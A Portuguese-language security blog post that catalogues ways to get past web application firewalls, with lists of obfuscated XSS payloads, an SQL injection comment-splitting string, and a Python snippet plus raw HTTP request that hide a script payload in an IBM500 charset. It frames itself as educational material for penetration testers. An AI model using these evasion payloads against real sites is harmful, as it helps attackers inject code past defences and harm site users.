---
date: 2023-01-07 16:58:42
layout: post
title: Maneiras de contornar seu firewall de aplicativo da Web (WAF)
description: Maneiras de contornar seu firewall de aplicativo da Web (WAF)
image: https://res.cloudinary.com/k4bv734/image/upload/v1689536360/waf_q61cuu.jpg
optimized_image: https://res.cloudinary.com/k4bv734/image/upload/v1689536360/waf_optimized_ooub1l.jpg
category: ciberseguranca
tags:
  - waf
  - cybersecurity
author: brunocosta
paginate: false
---
> **Aviso: Conteúdo Sensível em Cibersegurança**

> Este aviso tem o objetivo de informar sobre a natureza sensível do conteúdo relacionado à cibersegurança que será abordado neste texto. O conteúdo a seguir foi criado com fins puramente educacionais e para pesquisa, visando a conscientização e a compreensão dos desafios enfrentados na proteção de sistemas e informações digitais.

Neste artigo, discutiremos as ferramentas e técnicas usadas por testadores de penetração de aplicativos da web e pesquisadores de segurança para contornar com sucesso as proteções do Firewall de Aplicativos da Web (WAF).

Dependendo dos mecanismos usados pelo firewall, os métodos de bypass podem variar. Por exemplo, os WAFs podem utilizar expressões regulares (regex) para detectar tráfego malicioso. As expressões regulares são usadas para identificar padrões em uma sequência de caracteres. Você pode ler mais sobre elas [aqui](https://regexr.com/). Além disso, os WAFs também podem usar detecção baseada em assinatura, na qual sequências conhecidas de tráfego malicioso possuem uma assinatura armazenada em um banco de dados, e o firewall verifica se há correspondência entre o tráfego da web e as assinaturas no banco de dados. Se houver correspondência, o tráfego é bloqueado. Além disso, alguns firewalls usam detecção baseada em heurística.

Agora vamos explorar algumas técnicas comuns de bypass do WAF juntamente com exemplos.

1. **Ignorando o Regex**: Este método se aplica à filtragem baseada em regex feita pelo WAF e pelo servidor web. Durante um teste de penetração de caixa preta, pode ser difícil descobrir a expressão regular exata utilizada pelo WAF. No entanto, se a expressão regular for conhecida, é possível contorná-la usando algumas técnicas. Aqui estão alguns exemplos:

   - Alteração do caso da carga útil
   - Uso de várias codificações
   - Substituição de funções ou caracteres
   - Uso de sintaxe alternativa
   - Uso de quebras de linha ou tabulações

   Os exemplos abaixo demonstram algumas abordagens para contornar o regex com comentários.
```
<sCrIpT>alert(XSS)</sCriPt> #alterando o caso da tag
<< script>alert(XSS)</script > #prependendo um "<"
<script>alert(XSS) adicional // #removendo o fechamento tag
<script>alert`XSS`</script> #usando acentos graves em vez de parênteses
java%0ascript:alert(1) #usando caracteres de nova linha codificados
<iframe src=http://malicous.com < #colchetes angulares duplos
<STYLE >.classname{background-image:url( "javascript:alert(XSS)" );}</STYLE> #tags incomuns
<img/src=1/onerror=alert(0)> #ignorar filtro de espaço usando / where espera-se um espaço
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaa aaaaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #caracteres extras
```



2. **Ofuscação**: Embora a ofuscação seja uma maneira possível de ignorar o regex, eles foram divididos em diferentes seções para mostrar mais exclusivamente uma seleção de técnicas de ofuscação. A ofuscação é uma técnica utilizada para tornar o código malicioso mais difícil de ser detectado pelo WAF. Aqui estão alguns exemplos de técnicas de ofuscação:

   - Uso de funções incomuns além de alert, console.log e prompt
   - Codificação octal
   - Codificação Unicode
   - Uso de comentários para quebrar instruções SQL
   - Uso de acentos graves ao invés de parênteses
   - Codificação Base64 do JavaScript
   - Codificação HTML

   Essas técnicas podem ajudar a contornar a detecção do WAF.
```
Function( "ale" + "rt(1)" )(); #usando funções incomuns além de alert, console.log e prompt
javascript:74163166147401571561541571411447514115414516216450615176 #codificação octal
<iframe src= "javascript:alert(`xss`)" > #codificação unicode
/? id =1+un/**/ion+sel/**/ect+1,2,3-- #usando comentários na consulta SQL para quebrar a instrução
new Function`alt\`6\``; #usando acentos graves ao invés de parênteses
data:text/html; base64 ,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 codificando o javascript
%26%2397;lert(1) #usando codificação HTML
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)" > #Using Line Feed (LF) line breaks
<BODY onload! #$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use quaisquer caracteres que não sejam letras, números ou caracteres de encapsulamento entre o manipulador de eventos e o sinal de igual (só funciona no motor Gecko)
```



3. **Variáveis não inicializadas**: Uma técnica potencialmente útil envolve o uso de variáveis não inicializadas na solicitação. Isso pode ser especialmente útil em cenários de execução de comandos, onde o Bash trata variáveis não inicializadas como strings vazias. Ao concatenar strings vazias com uma carga útil de comando, é possível obter o resultado desejado. Isso pode ser usado como uma forma de ofuscação para contornar firewalls.



4. **Tamanho do conteúdo**: Alguns WAFs baseados em nuvem podem não verificar uma solicitação se o tamanho do conteúdo exceder um limite específico. Nesses casos, é possível contornar o firewall aumentando o tamanho do corpo da solicitação ou da URL.

4. **Conjunto de caracteres**: A técnica de Conjunto de Caracteres envolve a modificação do cabeçalho Content-Type para usar um conjunto de caracteres diferente, como por exemplo "ibm500". Um WAF que não está configurado para detectar cargas maliciosas em diferentes codificações pode não reconhecer a solicitação como maliciosa. A codificação do conjunto de caracteres pode ser feita em Python da seguinte maneira:

```python
import urllib.parse
s = '<script>alert("xss")</script>'
urllib.parse.quote_plus(s.encode("IBM037"))
```

A string codificada pode então ser enviada no corpo da solicitação e carregada no servidor, como exemplificado abaixo:

```
POST /comentário/post HTTP/1.1
Host: chatapp
Content-Type: application/x-www-form-urlencoded; charset=ibm500
Content-Length: 74

%A2%83%99%89%97%A3n%81%93%85%99%A3M%7F%A7%A2%A2%7F%5DLa%A2%83%99%89%97%A3n
```

Essa técnica permite que a solicitação seja processada pelo servidor, contornando as verificações do WAF que não estão configuradas para detectar essa codificação específica.




Para obter mais informações e explorar outras técnicas, veja mais em:
- [How to bypass WAF - HackenProof Cheat Sheet](https://hacken.io/discover/how-to-bypass-waf-hackenproof-cheat-sheet/)
- [Bypassing Web Application Firewall (WAF) - Unicode](https://jlajara.gitlab.io/Bypass_WAF_Unicode)
- [Web Application Firewall Bypass Techniques](https://blog.yeswehack.com/yeswerhackers/web-application-firewall-bypass/)
- [Identifying Web Application Firewall in a Network](https://www.sisainfosec.com/blogs/identifying-web-application-firewall-in-a-network/)
- [OWASP Stammtisch Frankfurt - WAF Profiling and Evasion](https://owasp.org/www-pdf-archive/OWASP_Stammtisch_Frankfurt_WAF_Profiling_and_Evasion.pdf)
- [5 Ways I Bypassed Your Web Application Firewall (WAF)](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2)

Esses recursos oferecem informações valiosas sobre como contornar as proteções do WAF em diferentes cenários.